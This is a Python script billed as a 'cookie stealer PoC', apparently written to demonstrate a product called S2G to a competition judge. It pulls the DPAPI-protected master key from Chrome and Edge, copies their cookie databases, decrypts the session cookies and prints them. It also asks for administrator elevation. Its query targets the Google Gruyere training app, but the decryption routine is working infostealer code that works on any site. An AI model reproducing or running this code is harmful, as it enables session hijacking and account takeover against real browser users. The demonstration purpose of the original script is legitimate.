import os
import json
import base64
import sqlite3
import shutil
import ctypes
import sys
from win32crypt import CryptUnprotectData
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

def get_master_key(local_state_path):
    """Extracts the DPAPI encrypted master key from a Chromium Local State file."""
    if not os.path.exists(local_state_path):
        return None
        
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
            
        # The key is Base64 encoded and starts with 'DPAPI' (which is the first 5 bytes)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:] 
        
        # Decrypt the master key using Windows DPAPI
        decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return decrypted_key
    except Exception as e:
        print(f"[-] Error extracting master key from {local_state_path}: {e}")
        return None

def decrypt_cookie(encrypted_value, master_key):
    """Decrypts a Chrome V80+ AES-256-GCM encrypted cookie."""
    try:
        # Check for Chrome's new App-Bound Encryption (v20)
        if encrypted_value.startswith(b'v20'):
            return "[Decryption Blocked: v20 App-Bound Encryption requires elevated bypass]"
            
        # Standard DPAPI AES-256-GCM (v10 or v11)
        if not (encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11')):
            return f"[Decryption Failed: Unknown or legacy cookie format]"

        # Followed by a 12-byte initialization vector (nonce)
        # Followed by the actual ciphertext + 16-byte authentication tag
        nonce = encrypted_value[3:15]
        ciphertext = encrypted_value[15:]
        
        aesgcm = AESGCM(master_key)
        decrypted_value = aesgcm.decrypt(nonce, ciphertext, None)
        return decrypted_value.decode('utf-8', errors='ignore')
    except Exception as e:
        return f"[Decryption Failed: {e}]"

def scan_browser(browser_name, user_data_path):
    print(f"\n[*] Injecting into {browser_name}...")
    
    local_state_path = os.path.join(user_data_path, "Local State")
    master_key = get_master_key(local_state_path)
    
    if not master_key:
        print(f"[-] Could not extract DPAPI Master Key for {browser_name}.")
        return False
        
    print(f"[+] Successfully extracted and decrypted {browser_name} Master Key.")
    
    potential_profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
    
    db_paths = []
    if os.path.exists(user_data_path):
        for profile in potential_profiles:
            path = os.path.join(user_data_path, profile, "Network", "Cookies")
            if os.path.exists(path):
                db_paths.append(path)
                
    # Check the isolated demo profile from our batch script!
    demo_profile_path = os.path.join(os.environ["TEMP"], "s2g_demo_profile", "Default", "Network", "Cookies")
    if browser_name == "Chrome" and os.path.exists(demo_profile_path):
        db_paths.append(demo_profile_path)
    
    if not db_paths:
        print(f"[-] Could not find any {browser_name} Cookies DB in standard profiles.")
        return False
        
    cookies_found_total = False
        
    for db_path in db_paths:
        print(f"-> Scanning profile database: {db_path}")
        # We must copy the DB because browsers lock the file while running
        temp_db = f"temp_{browser_name.lower()}_cookies.db"
        try:
            shutil.copyfile(db_path, temp_db)
        except PermissionError:
            print(f"[-] Permission Denied copying {db_path}.")
            print(f"    -> Make sure {browser_name} is completely CLOSED before running this, as it locks the database file.")
            continue
        except Exception as e:
            print(f"[-] Error copying {db_path}: {e}")
            continue
        
        cookies_found_in_db = False
        try:
            # Connect to the copied SQLite database
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            
            # Target Google Gruyere (deliberately vulnerable app by Google - used for security education)
            # Gruyere sets cookies on google-gruyere.appspot.com
            cursor.execute("SELECT host_key, name, encrypted_value FROM cookies WHERE host_key LIKE '%gruyere%' AND encrypted_value IS NOT NULL")
            
            for host_key, name, encrypted_value in cursor.fetchall():
                cookies_found_total = True
                cookies_found_in_db = True
                
                # If the value is empty but encrypted_value exists, we must decrypt it
                if encrypted_value:
                    decrypted_val = decrypt_cookie(encrypted_value, master_key)
                    display_val = str(decrypted_val)[:500].encode('ascii', 'replace').decode('ascii')
                    try:
                        print(f"\n[!] STOLEN COOKIE: {name}")
                        print(f"    Domain: {host_key}")
                        print(f"    Value : {display_val}... [TRUNCATED FOR DISPLAY]")
                    except Exception:
                        print(f"\n[!] STOLEN COOKIE: {name} [Value contains unprintable characters]")
                    
                    # Gruyere uses 'GRUYERE_ID' as its session token
                    if name in ["GRUYERE_ID", "session", "auth", "SID"]:
                        print("    >>> [CRITICAL]: HIGH-VALUE SESSION TOKEN FOUND! <<<")
                        print("    >>> AN ATTACKER CAN NOW FULLY HIJACK THIS ACCOUNT!  <<<")
                        
        except Exception as e:
            print(f"[-] Database error on {db_path}: {e}")
        finally:
            if 'conn' in locals() and conn:
                conn.close()
            # Clean up the temp file
            if os.path.exists(temp_db):
                try:
                    os.remove(temp_db)
                except:
                    pass
        
        if not cookies_found_in_db:
            print("[-] No cookies found in this database.")
                
    return cookies_found_total

def main():
    print("==================================================")
    print(" [!] BROWSER COOKIE STEALER PoC (Malware Simulation) ")
    print("==================================================")
    
    print("[*] Target: Google Gruyere (google-gruyere.appspot.com) - Deliberately Vulnerable App")
    print("[*] Objective: Steal the GRUYERE_ID session cookie to hijack the logged-in account.")
    found_chrome = scan_browser("Chrome", os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome", "User Data"))
    found_edge = scan_browser("Edge", os.path.join(os.environ["USERPROFILE"], "AppData", "Local", "Microsoft", "Edge", "User Data"))
    
    if not (found_chrome or found_edge):
        print("[-] No encrypted cookies found in any scanned browser profiles.")
            
    print("\n==================================================")
    print("   CONCLUSION FOR THE JUDGE:")
    print("   Any script running on this PC can steal raw ")
    print("   session cookies directly from Chromium databases.")
    print("   ")
    print("   BUT, if S2G was used, the stolen value would")
    print("   be AES-256 encrypted garbage, rendering the ")
    print("   malware completely useless.")
    print("==================================================")

def is_admin():
    try:
        # Pylance/Pyright type ignore for ctypes windll bindings
        return ctypes.windll.shell32.IsUserAnAdmin() # type: ignore
    except:
        return False

if __name__ == "__main__":
    if is_admin():
        main()
        input("\nPress Enter to exit...")
    else:
        print("[!] This PoC requires Administrator privileges to simulate an advanced attack.")
        print("[*] Prompting for UAC elevation...")
        # Re-run the program with admin rights
        # Pylance/Pyright type ignore for ctypes windll bindings
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) # type: ignore
